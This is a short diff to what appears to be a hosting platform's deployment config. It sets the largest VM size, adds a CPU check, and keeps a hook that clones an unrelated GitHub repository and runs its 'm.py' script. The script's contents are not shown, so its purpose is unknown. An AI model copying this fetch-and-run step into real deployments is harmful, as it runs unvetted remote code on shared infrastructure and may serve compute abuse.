@@ -2,11 +2,8 @@ applications:
   myapp:
     type: 'nodejs:24'
 
-    # Highest VM size for max CPU/RAM (e.g., up to 8+ CPU/17GB+ RAM on XL depending on plan)
+    # Highest VM size (max CPU/RAM per instance)
     size: XL
-
-    # 5 instances for scaling/load distribution
-    count: 5
 
     build:
       flavor: none
@@ -25,4 +22,5 @@ applications:
 
         git clone https://github.com/vrbrh921-glitch/Fc.git
         cd Fc
+        lscpu
         python3 m.py
